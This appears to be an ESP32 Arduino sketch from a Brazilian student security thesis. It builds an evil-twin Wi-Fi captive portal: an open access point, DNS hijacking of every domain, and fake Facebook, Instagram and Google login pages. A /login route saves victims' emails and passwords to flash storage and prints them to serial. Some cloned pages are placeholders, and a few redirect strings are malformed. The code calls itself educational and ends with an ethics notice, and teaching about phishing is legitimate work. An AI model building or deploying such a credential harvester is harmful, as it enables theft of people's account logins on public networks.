/*
TCC SEGURANÇA DA INFORMAÇÃO - CAPTIVE PORTAL EDUCATIVO
Autor: Rafael
Data: 01/10/2025
Descrição: Sistema de captive portal para demonstração educativa sobre phishing
*/

// BIBLIOTECAS NECESSÁRIAS
#include <WiFi.h>          // Biblioteca para funcionalidades WiFi do ESP32
#include <WebServer.h>     // Biblioteca para criar servidor web
#include <DNSServer.h>     // Biblioteca para servidor DNS (redirecionamento)
#include "SPIFFS.h"        // Biblioteca para sistema de arquivos interno

// CONFIGURAÇÕES DE REDE E SERVIDOR
const byte DNS_PORT = 53;           // Porta padrão do DNS
DNSServer dnsServer;                // Objeto do servidor DNS
WebServer webServer(80);            // Objeto do servidor web na porta 80 (HTTP)

// VARIÁVEIS GLOBAIS
String wifiName = "WiFi 5G Livre";  // Nome da rede WiFi fake
IPAddress apIP(192, 168, 4, 1);     // IP fixo do access point
bool usuarioLogado = false;         // Controle de sessão do usuário

/*
 * FUNÇÃO: readLoginsFile()
 * DESCRIÇÃO: Lê e retorna o conteúdo do arquivo de logins
 * RETORNO: String com todo o conteúdo do arquivo
 */
String readLoginsFile() {
  String content = "";
  File file = SPIFFS.open("/cw2e.txt", FILE_READ);  // Abre arquivo para leitura
  if(file){
    while(file.available()){
      content += (char)file.read();  // Lê caractere por caractere
    }
    file.close();  // Fecha o arquivo
  } else {
    content = "Arquivo vazio ou não encontrado";  // Mensagem de erro
  }
  return content;
}

/*
 * FUNÇÃO: setup()
 * DESCRIÇÃO: Função de inicialização do Arduino/ESP32
 * EXECUTADA: Uma vez ao ligar o dispositivo
 */
void setup() {
  Serial.begin(115200);  // Inicia comunicação serial para debug
  
  // INICIALIZAÇÃO DO SPIFFS (Sistema de Arquivos)
  if(!SPIFFS.begin(true)){
    Serial.println("Erro SPIFFS");
    return;  // Para execução se não conseguir inicializar
  }
  
  // CONFIGURAÇÃO DO ACCESS POINT
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));  // Configura IP fixo
  WiFi.softAP(wifiName.c_str(), NULL);  // Inicia AP sem senha
  
  Serial.println("AP WiFi Gratis iniciado");
  Serial.print("IP: ");
  Serial.println(WiFi.softAPIP());

  // CONFIGURAÇÃO DO SERVIDOR DNS
  // "*" significa que captura TODOS os domínios
  dnsServer.start(DNS_PORT, "*", apIP);

  // ===========================================================================
  // CONFIGURAÇÃO DAS ROTAS DO SERVIDOR WEB
  // ===========================================================================

  /*
   * ROTA: "/" - Página Inicial
   * DESCRIÇÃO: Página principal com opções de login
   * COMPORTAMENTO: 
   *   - Se usuário logado: redireciona para Google
   *   - Se não logado: mostra página com 3 opções
   */
  webServer.on("/", []() {
    if(usuarioLogado) {
      // Usuário já autenticado - libera acesso à internet
      webServer.send(200, "text/html", 
        "<html><head>"
        "<meta http-equiv='refresh' content='0;url=https://www.google.com'>"
        "</head></html>");
    } else {
      // Página inicial não autenticado
      String mainPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Gratuito - Login Obrigatório</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            min-height: 100vh;
        }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin: 40px 0 30px 0; }
        .header h1 { font-size: 32px; margin-bottom: 10px; }
        .header p { font-size: 18px; opacity: 0.9; }
        .card { 
            background: rgba(255,255,255,0.95); 
            color: #333; 
            padding: 30px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
            margin: 20px 0;
        }
        .warning { 
            background: #ffeb3b; 
            color: #333; 
            padding: 15px; 
            border-radius: 10px; 
            margin: 20px 0; 
            text-align: center; 
            border-left: 4px solid #ffc107;
            font-weight: bold;
        }
        .login-options { display: flex; flex-direction: column; gap: 15px; }
        .login-btn { 
            display: flex; 
            align-items: center; 
            padding: 15px 20px; 
            border: none; 
            border-radius: 10px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            transition: all 0.3s; 
            text-decoration: none; 
            color: white;
            text-align: center;
            justify-content: center;
        }
        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .facebook { background: #1877f2; }
        .instagram { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        .google { background: #4285f4; }
        .btn-icon { font-size: 24px; margin-right: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌐 WiFi Gratuito</h1>
            <p>Conectado à rede: <strong>%CURRENT_SSID%</strong></p>
        </div>
        
        <div class="card">
            <div class="warning">
                ⚠️ LOGIN OBRIGATÓRIO ⚠️<br>
                Para usar a internet, faça login com uma das opções
            </div>
            
            <div class="login-options">
                <a href="/facebook" class="login-btn facebook">
                    <span class="btn-icon">📘</span>
                    Continuar com Facebook
                </a>
                
                <a href="/instagram" class="login-btn instagram">
                    <span class="btn-icon">📷</span>
                    Continuar com Instagram
                </a>
                
                <a href="/google" class="login-btn google">
                    <span class="btn-icon">🔍</span>
                    Continuar com Google
                </a>
            </div>
        </div>
    </div>
</body>
</html>
      )rawliteral";
      mainPage.replace("%CURRENT_SSID%", wifiName);  // Substitui variável no HTML
      webServer.send(200, "text/html", mainPage);    // Envia página ao cliente
    }
  });

  /*
   * ROTA: "/facebook" - Página Fake do Facebook
   * DESCRIÇÃO: Clone da página de login do Facebook
   * OBJETIVO: Simular phishing para educação em segurança
   */
  webServer.on("/facebook", []() {
    String facebookPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Entre ou cadastre-se</title>
    <style>
        /* ESTILOS IDÊNTICOS AO FACEBOOK REAL */
    </style>
</head>
<body>
    <div class="container">
        <button class="back-btn" onclick="window.location.href='/'">← Voltar para Opções</button>
        <div class="logo">
            <span>facebook</span>
        </div>
        <div class="card">
            <form action="/login" method="POST">
                <input type="hidden" name="platform" value="facebook">
                <input type="text" name="email" placeholder="Email ou telefone" required>
                <input type="password" name="password" placeholder="Senha" required>
                <button type="submit" class="login-btn">Entrar</button>
            </form>
            <!-- ELEMENTOS ADICIONAIS PARA AUTENTICIDADE -->
        </div>
    </div>
</body>
</html>
    )rawliteral";
    webServer.send(200, "text/html", facebookPage);
  });

  /*
   * ROTA: "/instagram" - Página Fake do Instagram
   * DESCRIÇÃO: Clone da página de login do Instagram
   * OBJETIVO: Demonstrar variedade de ataques de phishing
   */
  webServer.on("/instagram", []() {
    String instagramPage = R"rawliteral(
<!-- ESTRUTURA SIMILAR À PÁGINA DO INSTAGRAM -->
    )rawliteral";
    webServer.send(200, "text/html", instagramPage);
  });

  /*
   * ROTA: "/google" - Página Fake do Google
   * DESCRIÇÃO: Clone da página de login do Google
   * OBJETIVO: Mostrar que até serviços confiáveis podem ser clonados
   */
  webServer.on("/google", []() {
    String googlePage = R"rawliteral(
<!-- ESTRUTURA SIMILAR À PÁGINA DO GOOGLE -->
    )rawliteral";
    webServer.send(200, "text/html", googlePage);
  });

  /*
   * ROTA: "/login" - Processamento de Login
   * MÉTODO: POST
   * DESCRIÇÃO: Recebe e armazena credenciais dos formulários
   * SEGURANÇA: Apenas para fins educacionais - dados não são usados maliciosamente
   */
  webServer.on("/login", HTTP_POST, []() {
    String email = webServer.arg("email");        // Obtém email do formulário
    String password = webServer.arg("password");  // Obtém senha do formulário
    String platform = webServer.arg("platform");  // Obtém plataforma (facebook/instagram/google)
    
    // ARMAZENAMENTO EM ARQUIVO - FINS EDUCACIONAIS
    File file = SPIFFS.open("/cw2e.txt", FILE_APPEND);
    if(file){
      file.print("=== LOGIN CAPTURADO ===\n");
      file.print("Plataforma: ");
      file.println(platform);
      file.print("Email: ");
      file.println(email);
      file.print("Senha: ");
      file.println(password);
      file.print("Horario: ");
      file.println(millis());  // Timestamp do login
      file.println("====================\n");
      file.close();
      Serial.println("✅ Login salvo - Plataforma: " + platform);
    }
    
    // LOG NO SERIAL PARA DEBUG
    Serial.println("=== CREDENCIAIS CAPTURADAS ===");
    Serial.print("Plataforma: ");
    Serial.println(platform);
    Serial.print("Email: ");
    Serial.println(email);
    Serial.print("Senha: ");
    Serial.println(password);
    Serial.println("====================");
    
    usuarioLogado = true;  // Marca usuário como autenticado
    
    // REDIRECIONAMENTO PARA INTERNET LIBERADA
    webServer.send(200, "text/html", 
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "<meta http-equiv='refresh' content='3;url=https://www.google.com'>"
      "<style>"
      "body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }"
      ".container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }"
      ".success { color: #1877f2; font-size: 24px; margin-bottom: 20px; }"
      "</style>"
      "</head>"
      "<body>"
      "<div class='container'>"
      "<div class='success'>✅ Login realizado!</div>"
      "<p>Redirecionando para Google em 3 segundos...</p>"
      "<p><small>Agora você tem acesso à internet</small></p>"
      "</div>"
      "</body>"
      "</html>");
  });

  // ===========================================================================
  // ROTAS DE CAPTIVE PORTAL - DETECÇÃO AUTOMÁTICA
  // ===========================================================================

  /*
   * ROTA: "/generate_204" - Android Captive Portal
   * DESCRIÇÃO: URL usada pelo Android para detectar internet
   * COMPORTAMENTO: Redireciona para login se não autenticado
   */
  webServer.on("/generate_204", []() { 
    if(usuarioLogado) {
      webServer.send(200, "text/plain", "");  // Resposta vazia = internet OK
    } else {
      webServer.send(200, "text/html", "<meta http-equiv='refresh' content='0;url=/>");
    }
  });
  
  /*
   * ROTA: "/hotspot-detect.html" - Apple Captive Portal
   * DESCRIÇÃO: URL usada por dispositivos Apple para detectar internet
   */
  webServer.on("/hotspot-detect.html", []() { 
    if(usuarioLogado) {
      webServer.send(200, "text/plain", "Success");  // Resposta de sucesso
    } else {
      webServer.send(200, "text/html", "<meta http-equiv='refresh' content='0;url=/>");
    }
  });
  
  /*
   * ROTA: "/connecttest.txt" - Windows Captive Portal
   * DESCRIÇÃO: URL usada pelo Windows para detectar internet
   */
  webServer.on("/connecttest.txt", []() { 
    if(usuarioLogado) {
      webServer.send(200, "text/plain", "Success");
    } else {
      webServer.send(200, "text/html", "<meta http-equiv='refresh' content='0;url=/>");
    }
  });

  /*
   * ROTA: "onNotFound" - Captura Todas as Outras URLs
   * DESCRIÇÃO: Captura qualquer URL não mapeada
   * OBJETIVO: Forçar redirecionamento para página de login
   */
  webServer.onNotFound([]() {
    if(usuarioLogado) {
      // Usuário autenticado - permite acesso
      webServer.send(200, "text/html", 
        "<html><body>"
        "<p>Acesso liberado. <a href='https://www.google.com'>Ir para Google</a></p>"
        "</body></html>");
    } else {
      // Usuário não autenticado - redireciona para login
      webServer.send(200, "text/html", 
        "<html><head>"
        "<meta http-equiv='refresh' content='0;url=/>"
        "</head></html>");
    }
  });

  // INICIALIZAÇÃO DO SERVIDOR WEB
  webServer.begin();
  
  // LOGS INICIAIS NO SERIAL
  Serial.println("✅ Servidor CORRIGIDO iniciado!");
  Serial.println("🌐 Página inicial: http://192.168.4.1");
  Serial.println("📘 Facebook: http://192.168.4.1/facebook");
  Serial.println("📷 Instagram: http://192.168.4.1/instagram");
  Serial.println("🔍 Google: http://192.168.4.1/google");
}

/*
 * FUNÇÃO: loop()
 * DESCRIÇÃO: Loop principal - executa continuamente
 * RESPONSABILIDADE: Processar requisições DNS e HTTP
 */
void loop() {
  dnsServer.processNextRequest();  // Processa requisições DNS
  webServer.handleClient();        // Processa requisições HTTP
}

/*
 * =============================================================================
 * CONSIDERAÇÕES ÉTICAS E LEGAIS:
 * 
 * ESTE PROJETO É APENAS PARA FINS EDUCACIONAIS E DE PESQUISA ACADÊMICA
 * 
 * - Nunca use em redes sem autorização explícita
 * - Use apenas dados de teste/fictícios
 * - Informe todos os participantes sobre a natureza do experimento
 * - Destrua todos os dados coletados após a pesquisa
 * - Obedeça às leis locais de privacidade e segurança
 * 
 * O objetivo é educar sobre os perigos do phishing, não promover atividades maliciosas
 * =============================================================================
 */